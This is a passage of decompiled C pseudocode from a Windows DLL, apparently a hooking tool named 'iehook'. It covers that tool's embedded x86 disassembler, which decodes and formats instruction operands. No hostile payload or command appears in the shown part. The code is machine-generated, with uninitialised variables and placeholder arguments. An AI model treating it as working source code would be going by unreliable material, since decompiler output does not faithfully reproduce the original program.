                                int32_t v32 = function_10001000((int32_t)*(char *)v30, v29); // 0x1000307f
                                *(int32_t *)(a2 + 8) = v32;
                                *(int32_t *)(a2 + 12) = v32 >> 31;
                                // break -> 0x100030a7
                                break;
                            }
                            default: {
                                // 0x10003090
                                __wassert();
                                // break -> 0x100030a7
                                break;
                            }
                        }
                    } else {
                        char * v33 = (char *)(v1 + 916); // 0x1000300b
                        char v34 = *v33; // 0x1000300b
                        if ((v34 & 16) == 0) {
                            // 0x10003018
                            if (a4 == 0) {
                                // branch -> 0x10003047
                            }
                            // 0x10003047
                            *v33 = v34 | 16;
                        }
                    }
                    // 0x100030a7
                    *v22 = *v22 | 0x80000;
                    char * v35 = (char *)(v1 + 774); // 0x100030ad
                    *v35 = *v35 | 64;
                }
                goto lab_0x100030b4;
            } else {
                unsigned char v36 = *v2 & 15;
                int32_t v37; // 0x10002c20
                if (v36 == 2) {
                    // 0x10002e46
                    *(int32_t *)(a2 + 16) = 9;
                    v37 = 9;
                } else {
                    switch ((int32_t)v36) {
                        case 4: {
                            // 0x10002e3d
                            *(int32_t *)(a2 + 16) = 10;
                            v37 = 10;
                            // break -> 0x10002e4d
                            break;
                        }
                        case 8: {
                            // 0x10002e34
                            *(int32_t *)(a2 + 16) = 11;
                            v37 = 11;
                            // break -> 0x10002e4d
                            break;
                        }
                        default: {
                            // 0x10002e14
                            __wassert();
                            return 0;
                        }
                    }
                }
                // 0x10002e4d
                v23 = (char *)(v1 + 774);
                *v23 = *v23 | 16;
                char * v38 = (char *)(v1 + 777); // 0x10002e57
                *v38 = *v38 | 1;
                *(int32_t *)(v1 + 764) = v37;
                *v22 = *v22 | 0x200180;
                char * v39 = (char *)(v1 + 916); // 0x10002e6a
                char v40 = *v39; // 0x10002e6a
                v10 = (char *)(v1 + 773);
                if ((v40 & 16) != 0) {
                    goto lab_0x10002eab;
                } else {
                    // 0x10002e73
                    if ((*v10 & 8) == 0) {
                        // 0x10002eb4
                        *(int32_t *)(v1 + 752) = 1;
                        goto lab_0x10002ebe;
                    } else {
                        char v41 = v40; // 0x10002e80
                        if (a4 == 0) {
                            int32_t v42 = *(int32_t *)(v1 + 288); // 0x10002e82
                            int32_t v43 = *(int32_t *)(v1 + 272); // 0x10002e89
                            _printf("[0x%08I64X] ANOMALY: Unexpected segment override\n", (int64_t)(v43 + v42));
                            v41 = *v39;
                        }
                        // 0x10002ea4
                        *v39 = v41 | 16;
                        goto lab_0x10002eab;
                    }
                }
            }
        } else {
            if (v24 != 128) {
                switch (v3 / 16) {
                    case 4: {
                        int32_t v44 = v9 / 16 | 144; // 0x10003288
                        int32_t * v45 = (int32_t *)(a2 + 16);
                        *v45 = v44;
                        v13 = v44;
                        if (*(int32_t *)(*(int32_t *)(v1 + 4) + 4) != 3) {
                            goto lab_0x1000329f;
                        } else {
                            // 0x10003299
                            v12 = v45;
                            v17 = v44 + 48;
                            goto lab_0x1000329c;
                        }
                    }
                    case 8: {
                        // 0x1000326f
                        v12 = (int32_t *)(a2 + 16);
                        v17 = v9 / 16 | 208;
                        goto lab_0x1000329c;
                    }
                    default: {
                        // 0x1000324f
                        __wassert();
                        return 0;
                    }
                }
            } else {
                // 0x100031ab
                int32_t v46; // 0x10002c20
                int32_t result = function_100024c0(result2, a3, a4, v46, v5, v6); // 0x100031ba
                if (result == 0) {
                    // 0x100031c9
                    __wassert();
                    return 0;
                }
                // 0x100031e9
                if ((*(char *)(v1 + 743) & -32) == -96) {
                    // 0x10003448
                    return result;
                }
                int32_t v47 = (int32_t)v8 - 1; // 0x10003202
                v16 = result;
                if (v47 == 0) {
                    goto lab_0x1000342b;
                } else {
                    // 0x10003209
                    if (v47 != 1) {
                        // 0x10003448
                        return result;
                    }
                    uint32_t v48 = *(int32_t *)result; // 0x10003213
                    *(int32_t *)(v1 + 784) = v48;
                    *(int32_t *)(v1 + 788) = v48 / 0x80000000;
                    if (v48 < 0x10000 || v48 >= 0x7fff0000) {
                        // 0x10003413
                        v18 = (int32_t *)(v1 + 296);
                        *v18 = *v18 + 4;
                        return result + 4;
                    }
                    int32_t * v49 = (int32_t *)a2; // 0x1000323a
                    *v49 = *v49 | 0x80000;
                    v11 = (char *)(v1 + 774);
                    v15 = result;
                    goto lab_0x1000340c;
                }
            }
        }
    } else {
        // 0x10002c71
        v20 = (int16_t *)(a2 + 6);
        uint16_t v50 = *v20; // 0x10002c74
        g152 = (int32_t)v50 - 1;
        switch (v50) {
            case 1: {
                int32_t v51 = v9 / 16 | 112; // 0x10002cc1
                *(int32_t *)(a2 + 16) = v51;
                v14 = v51;
                if (*(char *)(v1 + 744) == 0) {
                    goto lab_0x10002cdf;
                } else {
                    goto lab_0x10002cd7;
                }
            }
            case 2: {
                int32_t v52 = v9 / 16 | 128; // 0x10002cac
                *(int32_t *)(a2 + 16) = v52;
                v14 = v52;
                goto lab_0x10002cd7;
            }
            case 4: {
                int32_t v53 = v9 / 16 | 144; // 0x10002c9c
                *(int32_t *)(a2 + 16) = v53;
                v14 = v53;
                goto lab_0x10002cd7;
            }
            case 8: {
                // 0x10002cdc
                *(int32_t *)(a2 + 16) = v9 / 16 | 208;
                goto lab_0x10002cdf;
            }
            default: {
                // 0x10002d92
                __wassert();
                return 0;
            }
        }
    }
  lab_0x10002f8f:;
    // 0x10002f8f
    int32_t v54; // 0x10002c20
    int32_t v55 = v54 + 1; // 0x10002f93
    int32_t v56; // 0x10002c20
    v56 += 4;
    v54 = v55;
    int32_t v57; // 0x10002c20
    int32_t v58 = v57; // 0x10002f9a
    int32_t * v59; // 0x10002c20
    int32_t * v60 = v59; // 0x10002f9a
    int32_t * v61; // 0x10002c20
    int32_t * v62 = v61; // 0x10002f9a
    int32_t v63 = v57; // 0x10002f9a
    int32_t * v64; // 0x10002ecb
    if (v55 >= *v64) {
        // break -> 0x10002fa0
        goto lab_0x10002fa0;
    }
    goto lab_0x10002ee1;
  lab_0x10002f51:
    // 0x10002f51
    *v61 = 0x10ef;
    *v59 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
    int32_t * v69; // 0x10002c20
    *v69 = (int32_t)&g3;
    __wassert();
    int32_t v65; // 0x10002c20
    v57 = v65;
    goto lab_0x10002f8f;
  lab_0x10002cdf:;
    int32_t * v73 = (int32_t *)a2; // 0x10002cdf
    if ((*v73 & 0x4000) != 0) {
        char * v74 = (char *)(v1 + 775); // 0x10002ce7
        *(char *)(v1 + 759 + (int32_t)(*v74 / 16 & 3)) = (char)a3;
        char v75 = *v74; // 0x10002cfe
        *v74 = v75 + 16 & 48 | v75 & -49;
        if (a3 >= 2) {
            // 0x10002d1e
            __wassert();
        }
        // 0x10002d35
        if (*v20 >= 2) {
            if ((v9 & 240) == 64) {
                int32_t * v76 = (int32_t *)(v1 + 280); // 0x10002d44
                *v76 = *v76 | 2048;
            }
        }
    }
    int32_t v77 = *v73; // 0x10002d4e
    int32_t v78 = v77; // 0x10002d54
    if ((v77 & 0x2000) != 0) {
        char * v79 = (char *)(v1 + 775); // 0x10002d56
        *(char *)(((int32_t)(*v79 / 64) | 756) + v1) = (char)a3;
        *v79 = *v79 + 64;
        v78 = *v73;
    }
    // 0x10002d82
    *v73 = v78 | 128;
    return result2;
  lab_0x10002cd7:
    // 0x10002cd7
    if (*(int32_t *)(*(int32_t *)(v1 + 4) + 4) != 3) {
        goto lab_0x10002cdf;
    } else {
        // 0x10002cdc
        *(int32_t *)(a2 + 16) = v14 + 48;
        goto lab_0x10002cdf;
    }
  lab_0x100030b4:;
    int32_t v80 = *v22; // 0x100030b4
    int32_t v81 = v80; // 0x100030ba
    if ((v80 & 0x4000) != 0) {
        char * v82 = (char *)(v1 + 774); // 0x100030bc
        char v83 = *v82; // 0x100030bc
        char v84 = v83; // 0x100030c3
        if ((v83 & 2) != 0) {
            // 0x100030c5
            *(int32_t *)(v21 - 4) = 0x10fd;
            *(int32_t *)(v21 - 8) = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
            *(int32_t *)(v21 - 12) = (int32_t)L"!X86Instruction->HasDstAddressing";
            __wassert();
            v84 = *v82;
        }
        char * v85 = (char *)(v1 + 775); // 0x100030dc
        *v82 = v84 | 2;
        char v86 = a3; // 0x100030f3
        *(char *)(v1 + 759 + (int32_t)(*v85 / 16 & 3)) = v86;
        char v87 = *v85; // 0x100030fa
        *v85 = v87 & -52 | v86 & 3 | v87 + 16 & 48;
        v81 = *v22;
    }
    // 0x10003121
    if ((v81 & 0x2000) == 0) {
        // 0x10003448
        return result3;
    }
    char * v88 = (char *)(v1 + 774);
    if (*(int32_t *)(v1 + 284) != 0x4001) {
        // 0x10003139
        if ((*v88 & 4) != 0) {
            // 0x10003142
            *(int32_t *)(v21 - 4) = 0x10fd;
            *(int32_t *)(v21 - 8) = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
            *(int32_t *)(v21 - 12) = (int32_t)L"!X86Instruction->HasSrcAddressing";
            __wassert();
        }
    }
    char * v89 = (char *)(v1 + 775); // 0x10003159
    *v88 = *v88 | 4;
    char v90 = a3; // 0x1000316a
    *(char *)(((int32_t)(*v89 / 64) | 756) + v1) = v90;
    char v91 = *v89; // 0x10003171
    *v89 = v91 & 51 | 4 * v90 & 12 | v91 + 64 & -64;
    return result3;
  lab_0x10002eab:
    // 0x10002eab
    if ((*v10 & 8) != 0) {
        goto lab_0x10002ebe;
    } else {
        // 0x10002eb4
        *(int32_t *)(v1 + 752) = 1;
        goto lab_0x10002ebe;
    }
  lab_0x1000342b:;
    int32_t v92 = (int32_t)*(char *)v16; // 0x1000342e
    *(int32_t *)(v1 + 784) = v92;
    *(int32_t *)(v1 + 788) = v92 >> 31;
    int32_t * v93 = (int32_t *)(v1 + 296); // 0x1000343e
    *v93 = *v93 + 1;
    // 0x10003448
    return v16 + 1;
  lab_0x10002ebe:
    // 0x10002ebe
    *v23 = *v23 | 64;
    int32_t v94 = a3 + 1; // 0x10002ec8
    v64 = (int32_t *)(v1 + 672);
    if (v94 >= *v64) {
        // 0x10002ebe
        v60 = (int32_t *)(v21 - 8);
        v62 = (int32_t *)(v21 - 4);
        v63 = 0;
    } else {
        // 0x10002ed7
        v61 = (int32_t *)(v21 - 4);
        v59 = (int32_t *)(v21 - 8);
        v69 = (int32_t *)(v21 - 12);
        v56 = 4 * v94 + 712 + v1;
        v54 = v94;
        v58 = 0;
        while (true) {
          lab_0x10002ee1:
            // 0x10002ee1
            v65 = v58;
            int32_t * v66 = (int32_t *)v56; // 0x10002ee4
            int32_t v67 = *v66; // 0x10002ee4
            if ((v67 & 0xff0000) != 0x60000) {
                goto lab_0x10002f8f;
            } else {
                int32_t v68 = v67; // 0x10002efa
                if (v65 != 0) {
                    // 0x10002efc
                    *v61 = 0x10d8;
                    *v59 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                    *v69 = (int32_t)L"!ImmediateSize";
                    __wassert();
                    v68 = *v66;
                }
                uint32_t v70 = v68 & -0xffff01; // 0x10002f18
                if (v70 < 0x7000001) {
                    // 0x10002f24
                    v57 = v65;
                    switch (v70) {
                        case 0x7000000: {
                            // 0x10002f37
                            v57 = (int32_t)(*v2 & 15);
                            goto lab_0x10002f8f;
                        }
                        case 2: {
                            goto lab_0x10002f8f;
                        }
                        default: {
                            if (v70 != 0x2000000) {
                                goto lab_0x10002f51;
                            } else {
                                // 0x10002f32
                                v57 = v70 - 0x1ffffff;
                                goto lab_0x10002f8f;
                            }
                        }
                    }
                } else {
                    // 0x10002f43
                    v57 = 2;
                    switch (v70) {
                        case 0x8000000: {
                            goto lab_0x10002f8f;
                        }
                        case 0x12000000: {
                            unsigned char v71 = *v2 & 15;
                            v57 = 2;
                            if (v71 != 2) {
                                int32_t v72 = (int32_t)v71 - 4; // 0x10002f79
                                v57 = 4;
                                if (v72 != 0 == (v72 != 4)) {
                                    // 0x10002fc6
                                    *v61 = 0x10e3;
                                    *v59 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                                    *v69 = (int32_t)&g3;
                                    __wassert();
                                    return 0;
                                }
                            }
                            goto lab_0x10002f8f;
                        }
                        default: {
                            goto lab_0x10002f51;
                        }
                    }
                }
            }
        }
    }
  lab_0x10002fa0:;
    int32_t v95 = result3 >> 31; // 0x10002fa3
    uint32_t v96 = v63 + result3; // 0x10002fa6
    *v62 = v95 + (int32_t)(v96 < v63);
    *v60 = v96;
    int32_t v97 = function_10002a90((int32_t)&g173, (int32_t)&g173); // 0x10002fae
    *(int32_t *)(a2 + 8) = v97;
    *(int32_t *)(a2 + 12) = v95;
    goto lab_0x100030b4;
  lab_0x1000329f:;
    char * v98 = (char *)(v1 + 774);
    *v98 = *v98 | 16;
    *(int32_t *)(v1 + 764) = v13;
    int32_t * v99 = (int32_t *)a2; // 0x100032af
    int32_t v100 = *v99 | 0x10080; // 0x100032af
    *v99 = v100;
    int32_t v101 = v100; // 0x100032bc
    if ((*(char *)(v1 + 773) & 8) == 0) {
        // 0x100032be
        v101 = v100;
        if ((v9 & 240) != 80 != (v9 & 240) != 64) {
            // 0x100032cb
            if ((*(char *)(v1 + 777) & 2) != 0) {
                // 0x100032d4
                __wassert();
            }
            // 0x100032ee
            *(int32_t *)(v1 + 752) = 2;
            v101 = *v99;
        }
    }
    int32_t v102 = v101; // 0x100032fe
    if ((v101 & 0x4000) != 0) {
        char v103 = *v98; // 0x10003300
        char v104 = v103; // 0x10003307
        if ((v103 & 2) != 0) {
            // 0x10003309
            __wassert();
            v104 = *v98;
        }
        char * v105 = (char *)(v1 + 775); // 0x10003323
        *v98 = v104 | 2;
        char v106 = a3; // 0x1000333a
        *(char *)(v1 + 759 + (int32_t)(*v105 / 16 & 3)) = v106;
        char v107 = *v105; // 0x10003341
        *v105 = v107 & -52 | v106 & 3 | v107 + 16 & 48;
        v102 = *v99;
    }
    // 0x10003367
    if ((v102 & 0x2000) != 0) {
        // 0x1000336f
        if (*(int32_t *)(v1 + 284) != 0x4001) {
            // 0x1000337b
            if ((*v98 & 4) != 0) {
                // 0x10003384
                __wassert();
            }
        }
        char * v108 = (char *)(v1 + 775); // 0x1000339e
        *v98 = *v98 | 4;
        char v109 = a3; // 0x100033af
        *(char *)(((int32_t)(*v108 / 64) | 756) + v1) = v109;
        char v110 = *v108; // 0x100033b6
        *v108 = v110 & 51 | 4 * v109 & 12 | v110 + 64 & -64;
    }
    int32_t v111 = (v19 & 3) - 1; // 0x100033e0
    v16 = result2;
    if (v111 == 0) {
        goto lab_0x1000342b;
    } else {
        // 0x100033e3
        if (v111 != 1) {
            // 0x10003448
            return result2;
        }
        uint32_t v112 = *(int32_t *)result2; // 0x100033e9
        *(int32_t *)(v1 + 784) = v112;
        *(int32_t *)(v1 + 788) = v112 / 0x80000000;
        if (v112 < 0x10000 || v112 >= 0x7fff0000) {
            // 0x10003413
            v18 = (int32_t *)(v1 + 296);
            *v18 = *v18 + 4;
            return result2 + 4;
        }
        // 0x10003406
        *v99 = *v99 | 0x80000;
        v11 = v98;
        v15 = result2;
        goto lab_0x1000340c;
    }
  lab_0x1000329c:
    // 0x1000329c
    *v12 = v17;
    v13 = v17;
    goto lab_0x1000329f;
  lab_0x1000340c:;
    char * v113 = v11;
    *v113 = *v113 | 64;
    // 0x10003413
    v18 = (int32_t *)(v1 + 296);
    *v18 = *v18 + 4;
    return v15 + 4;
}

// Address range: 0x10003490 - 0x1000b562
int32_t function_10003490(int32_t a1, int32_t a2, int32_t a3) {
    // 0x10003490
    int32_t v1; // 0x10003490
    char * v2 = (char *)(v1 + 774); // 0x100034aa
    char * v3 = (char *)(v1 + 742);
    char v4 = *v3;
    char v5; // 0x10003490
    int32_t result; // 0x10003490
    char v6; // 0x10003490
    if ((*v2 & 8) == 0) {
        // 0x1000353f
        v6 = v4;
        result = a2;
        v5 = *(char *)(v1 + 746);
    } else {
        char * v7 = (char *)(v1 + 741); // 0x100034ce
        char v8 = *v7 / 64 | v4 & -4; // 0x100034da
        *v3 = v8;
        char v9 = (*v7 / 2 ^ v4) & 28 ^ v8; // 0x100034ee
        *v3 = v9;
        char v10 = 32 * *v7; // 0x100034ff
        char v11 = v9 & 31 | v10; // 0x10003502
        *v3 = v11;
        char v12 = *(char *)(v1 + 745); // 0x1000350a
        char v13 = ((v12 & 32 | v9 & 28) / 2 | v10) / 2 | v12 & -128; // 0x1000352c
        *(char *)(v1 + 746) = v13;
        int32_t * v14 = (int32_t *)(v1 + 296); // 0x10003534
        *v14 = *v14 + 1;
        v6 = v11;
        result = a2 + 1;
        v5 = v13;
    }
    int32_t * v15 = (int32_t *)(v1 + 672); // 0x1000354e
    if (*v15 == 0) {
        // 0x1000af28
        return result;
    }
    int32_t v16 = a3 & 8; // 0x100034a3
    int32_t v17 = v1 + 336;
    char * v18 = (char *)(v1 + 264);
    int32_t v19 = v1 + 8;
    int16_t * v20 = (int16_t *)(v1 + 342);
    int32_t * v21 = (int32_t *)(v1 + 288);
    int32_t v22 = v1 + 272;
    int32_t * v23 = (int32_t *)v22;
    int32_t * v24 = (int32_t *)(v1 + 276);
    char * v25 = (char *)(v1 + 916);
    char * v26 = (char *)(v1 + 776);
    int32_t * v27 = (int32_t *)(v1 + 4);
    char * v28 = (char *)(v1 + 773);
    char * v29 = (char *)(v1 + 775);
    int32_t v30 = v1 + 759;
    char * v31 = (char *)(v1 + 744);
    char v32 = *(char *)(v1 + 320) & 7;
    int32_t * v33 = (int32_t *)(v1 + 280);
    int32_t * v34 = (int32_t *)(v1 + 284);
    int32_t * v35 = (int32_t *)(v1 + 764);
    int32_t v36 = v1 + 752;
    int32_t * v37 = (int32_t *)v36;
    unsigned char v38 = v5 / 16;
    int32_t v39 = v38 | 96;
    unsigned char v40 = v5 & -16;
    int32_t v41 = v38 | 80;
    unsigned char v42 = v5 & 15;
    int32_t v43 = v42;
    int32_t v44 = v1 + 784;
    int32_t * v45 = (int32_t *)v44;
    int32_t * v46 = (int32_t *)(v1 + 788);
    char * v47 = (char *)(v1 + 777);
    int32_t * v48 = (int32_t *)(v1 + 296);
    int16_t * v49 = (int16_t *)v44;
    char * v50 = (char *)v36;
    int32_t v51 = v42 | -112;
    int32_t v52 = v42 | -128;
    int32_t v53 = v42 | 112;
    int32_t v54 = result; // 0x10003490
    char v55 = 0; // 0x10003490
    int32_t v56; // bp-40, 0x10003490
    int32_t v57 = &v56; // 0x10003490
    int32_t * v58; // 0x10003490
    int32_t * v59; // 0x10003490
    int32_t v60; // 0x10003490
    int32_t v61; // 0x10003490
    int32_t v62; // 0x10003490
    int32_t v63; // 0x10003490
    int32_t v64; // 0x10003490
    int32_t v65; // 0x10003490
    int32_t v66; // 0x10003490
    int32_t v67; // 0x10003490
    int32_t v68; // 0x10003490
    int32_t v69; // 0x10003490
    int32_t v70; // 0x10003490
    int32_t v71; // 0x10003490
    int32_t v72; // 0x10003490
    int32_t v73; // 0x10003490
    int32_t v74; // 0x10003490
    unsigned char v75; // 0x10003490
    int16_t * v76; // 0x100042c2
    unsigned char v77; // 0x100042d7
    int32_t v78; // 0x10003565
    int32_t v79; // 0x1000356e
    uint32_t v80; // 0x1000358f
    uint32_t v81; // 0x100035a3
    while (true) {
      lab_0x10003565:
        // 0x10003565
        v63 = v57;
        v75 = v55;
        v69 = v54;
        v78 = v75;
        v79 = 112 * v78 + v17;
        if ((*(char *)v79 & 127) != 0) {
            // 0x10003575
            *(int32_t *)(v63 - 4) = 2571;
            *(int32_t *)(v63 - 8) = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
            *(int32_t *)(v63 - 12) = (int32_t)L"!(Operand->Flags & 0x7F)";
            __wassert();
        }
        // 0x1000358c
        v80 = *(int32_t *)(v1 + 712 + 4 * v78);
        v81 = v80 & -0xffff01;
        if ((a3 & 4) != 0 && v75 != 0) {
            unsigned char v82 = *v18; // 0x100035bd
            int32_t v83 = v82; // 0x100035bd
            *(int32_t *)(v63 - 4) = (int32_t)", ";
            *(int32_t *)(v63 - 8) = v82 == -1 ? 0 : 256 - v83;
            *(int32_t *)(v63 - 12) = v19 + v83;
            int32_t v84 = __snprintf((char *)(v80 & 0xff80), v81, (char *)&g173); // 0x100035e4
            *v18 = *v18 + (char)v84;
        }
        if (v81 < 0x1000001) {
            if (v81 == 0x1000000) {
                // 0x100072ae
                if (*(char *)(v1 + 321) != 98) {
                    // 0x100072b7
                    *(int32_t *)(v63 - 4) = 3286;
                    *(int32_t *)(v63 - 8) = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                    *(int32_t *)(v63 - 12) = (int32_t)L"Instruction->OpcodeBytes[0] == X86_BOUND";
                    __wassert();
                }
                unsigned char v85 = *v26 & 15;
                if (v85 == 2) {
                    // 0x100076d5
                    *(int16_t *)(v79 + 6) = 4;
                    goto lab_0x100076d9;
                } else {
                    int32_t v86 = (int32_t)v85 - 4; // 0x100072e7
                    if (v86 != 0 == (v86 != 4)) {
                        // 0x1000b00a
                        *(int32_t *)(v63 - 4) = 3291;
                        *(int32_t *)(v63 - 8) = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                        *(int32_t *)(v63 - 12) = (int32_t)&g3;
                        __wassert();
                        return 0;
                    }
                    // 0x100076d5
                    *(int16_t *)(v79 + 6) = 8;
                    goto lab_0x100076d9;
                }
            } else {
                // 0x1000360a
                g154 = v81;
                switch (v81) {
                    case 0: {
                        goto lab_0x100059ef;
                    }
                    case 1: {
                        // 0x10003626
                        if ((a3 & 4) == 0) {
                            goto lab_0x1000af15;
                        } else {
                            // 0x10003631
                            *(int32_t *)(v79 + 32) = 0;
                            *(int32_t *)(v79 + 36) = 0;
                            char * v87 = (char *)(v79 + 4); // 0x10003637
                            *v87 = *v87 & -64 | 1;
                            v74 = v69;
                            v67 = v63;
                            if ((a3 & 2) == 0) {
                                goto lab_0x1000af15;
                            } else {
                                unsigned char v88 = *v18; // 0x1000364c
                                int32_t v89 = v88; // 0x1000364c
                                int32_t * v90 = (int32_t *)(v63 - 4); // 0x10003661
                                *v90 = (int32_t)"<0>";
                                int32_t * v91 = (int32_t *)(v63 - 8); // 0x10003666
                                *v91 = v88 == -1 ? 0 : 256 - v89;
                                int32_t * v92 = (int32_t *)(v63 - 12); // 0x1000366e
                                *v92 = v19 + v89;
                                int32_t v93 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x1000366f
                                unsigned char v94 = *v18 + (char)v93; // 0x10003674
                                *v18 = v94;
                                v74 = v69;
                                v67 = v63;
                                if ((a3 & 16) == 0) {
                                    goto lab_0x1000af15;
                                } else {
                                    // 0x1000368d
                                    *(char *)(v19 + (int32_t)v94) = 123;
                                    *v18 = *v18 + 1;
                                    int32_t * v95 = (int32_t *)v79; // 0x1000369b
                                    int32_t v96 = *v95; // 0x1000369b
                                    int32_t v97 = v96; // 0x100036a1
                                    if ((v96 & 0xe000) == 0) {
                                        // 0x100036a3
                                        *v90 = 2592;
                                        *v91 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                                        *v92 = (int32_t)L"Operand->Flags & (OP_EXEC|OP_SRC|OP_DST)";
                                        __wassert();
                                        v97 = *v95;
                                    }
                                    int32_t v98 = v97; // 0x100036c0
                                    if ((v97 & 0x200000) != 0) {
                                        // 0x100036c2
                                        *(char *)(v19 + (int32_t)*v18) = 114;
                                        *v18 = *v18 + 1;
                                        v98 = *v95;
                                    }
                                    int32_t v99 = v98; // 0x100036da
                                    if ((v98 & 0x100000) != 0) {
                                        // 0x100036dc
                                        *(char *)(v19 + (int32_t)*v18) = 102;
                                        *v18 = *v18 + 1;
                                        v99 = *v95;
                                    }
                                    int32_t v100 = v99; // 0x100036f4
                                    if ((v99 & 1024) != 0) {
                                        // 0x100036f6
                                        *(char *)(v19 + (int32_t)*v18) = 99;
                                        *v18 = *v18 + 1;
                                        v100 = *v95;
                                    }
                                    // 0x10003708
                                    v72 = v69;
                                    v61 = v100;
                                    v65 = v63;
                                    if ((int16_t)v100 > -1) {
                                        goto lab_0x1000ae34;
                                    } else {
                                        // 0x10003715
                                        *(char *)(v19 + (int32_t)*v18) = 88;
                                        v73 = v69;
                                        v66 = v63;
                                        goto lab_0x1000ae47;
                                    }
                                }
                            }
                        }
                    }
                    case 2: {
                        // 0x10003726
                        v74 = v69;
                        v67 = v63;
                        if ((a3 & 4) == 0) {
                            goto lab_0x1000af15;
                        } else {
                            // 0x10003731
                            *(int32_t *)(v79 + 32) = 1;
                            *(int32_t *)(v79 + 36) = 0;
                            char * v101 = (char *)(v79 + 4); // 0x1000373b
                            *v101 = *v101 & -64 | 1;
                            v74 = v69;
                            v67 = v63;
                            if ((a3 & 2) == 0) {
                                goto lab_0x1000af15;
                            } else {
                                unsigned char v102 = *v18; // 0x10003750
                                int32_t v103 = v102; // 0x10003750
                                int32_t * v104 = (int32_t *)(v63 - 4); // 0x10003765
                                *v104 = (int32_t)"<1>";
                                int32_t * v105 = (int32_t *)(v63 - 8); // 0x1000376a
                                *v105 = v102 == -1 ? 0 : 256 - v103;
                                int32_t * v106 = (int32_t *)(v63 - 12); // 0x10003772
                                *v106 = v19 + v103;
                                int32_t v107 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x10003773
                                unsigned char v108 = *v18 + (char)v107; // 0x10003778
                                *v18 = v108;
                                v74 = v69;
                                v67 = v63;
                                if ((a3 & 16) == 0) {
                                    goto lab_0x1000af15;
                                } else {
                                    // 0x10003791
                                    *(char *)(v19 + (int32_t)v108) = 123;
                                    *v18 = *v18 + 1;
                                    int32_t * v109 = (int32_t *)v79; // 0x1000379f
                                    int32_t v110 = *v109; // 0x1000379f
                                    int32_t v111 = v110; // 0x100037a5
                                    if ((v110 & 0xe000) == 0) {
                                        // 0x100037a7
                                        *v104 = 2603;
                                        *v105 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                                        *v106 = (int32_t)L"Operand->Flags & (OP_EXEC|OP_SRC|OP_DST)";
                                        __wassert();
                                        v111 = *v109;
                                    }
                                    int32_t v112 = v111; // 0x100037c4
                                    if ((v111 & 0x200000) != 0) {
                                        // 0x100037c6
                                        *(char *)(v19 + (int32_t)*v18) = 114;
                                        *v18 = *v18 + 1;
                                        v112 = *v109;
                                    }
                                    int32_t v113 = v112; // 0x100037de
                                    if ((v112 & 0x100000) != 0) {
                                        // 0x100037e0
                                        *(char *)(v19 + (int32_t)*v18) = 102;
                                        *v18 = *v18 + 1;
                                        v113 = *v109;
                                    }
                                    int32_t v114 = v113; // 0x100037f8
                                    if ((v113 & 1024) != 0) {
                                        // 0x100037fa
                                        *(char *)(v19 + (int32_t)*v18) = 99;
                                        *v18 = *v18 + 1;
                                        v114 = *v109;
                                    }
                                    // 0x1000380c
                                    v72 = v69;
                                    v61 = v114;
                                    v65 = v63;
                                    if ((int16_t)v114 > -1) {
                                        goto lab_0x1000ae34;
                                    } else {
                                        // 0x10003819
                                        *(char *)(v19 + (int32_t)*v18) = 88;
                                        v73 = v69;
                                        v66 = v63;
                                        goto lab_0x1000ae47;
                                    }
                                }
                            }
                        }
                    }
                    case 3: {
                        // 0x1000382a
                        v74 = v69;
                        v67 = v63;
                        if ((a3 & 4) == 0) {
                            goto lab_0x1000af15;
                        } else {
                            // 0x10003835
                            *(int32_t *)(v79 + 32) = 255;
                            *(int32_t *)(v79 + 36) = 0;
                            char * v115 = (char *)(v79 + 4); // 0x1000383f
                            *v115 = *v115 & -64 | 1;
                            v74 = v69;
                            v67 = v63;
                            if ((a3 & 2) == 0) {
                                goto lab_0x1000af15;
                            } else {
                                unsigned char v116 = *v18; // 0x10003854
                                int32_t v117 = v116; // 0x10003854
                                int32_t * v118 = (int32_t *)(v63 - 4); // 0x10003869
                                *v118 = (int32_t)"<0xFF>";
                                int32_t * v119 = (int32_t *)(v63 - 8); // 0x1000386e
                                *v119 = v116 == -1 ? 0 : 256 - v117;
                                int32_t * v120 = (int32_t *)(v63 - 12); // 0x10003876
                                *v120 = v19 + v117;
                                int32_t v121 = __snprintf((char *)&g173, (int32_t)&g173, (char *)&g173); // 0x10003877
                                unsigned char v122 = *v18 + (char)v121; // 0x1000387c
                                *v18 = v122;
                                v74 = v69;
                                v67 = v63;
                                if ((a3 & 16) == 0) {
                                    goto lab_0x1000af15;
                                } else {
                                    // 0x10003895
                                    *(char *)(v19 + (int32_t)v122) = 123;
                                    *v18 = *v18 + 1;
                                    int32_t * v123 = (int32_t *)v79; // 0x100038a3
                                    int32_t v124 = *v123; // 0x100038a3
                                    int32_t v125 = v124; // 0x100038a9
                                    if ((v124 & 0xe000) == 0) {
                                        // 0x100038ab
                                        *v118 = 2614;
                                        *v119 = (int32_t)L"..\\iehook\\iehook\\disasm-lib\\disasm_x86.c";
                                        *v120 = (int32_t)L"Operand->Flags & (OP_EXEC|OP_SRC|OP_DST)";
                                        __wassert();
                                        v125 = *v123;
                                    }
                                    int32_t v126 = v125; // 0x100038c8
                                    if ((v125 & 0x200000) != 0) {
                                        // 0x100038ca
                                        *(char *)(v19 + (int32_t)*v18) = 114;
                                        *v18 = *v18 + 1;
                                        v126 = *v123;
                                    }
                                    int32_t v127 = v126; // 0x100038e2
                                    if ((v126 & 0x100000) != 0) {
                                        // 0x100038e4
                                        *(char *)(v19 + (int32_t)*v18) = 102;
                                        *v18 = *v18 + 1;
                                        v127 = *v123;
                                    }
                                    int32_t v128 = v127; // 0x100038fc
                                    if ((v127 & 1024) != 0) {
                                        // 0x100038fe
                                        *(char *)(v19 + (int32_t)*v18) = 99;
                                        *v18 = *v18 + 1;
                                        v128 = *v123;
                                    }
                                    // 0x10003910
                                    v72 = v69;
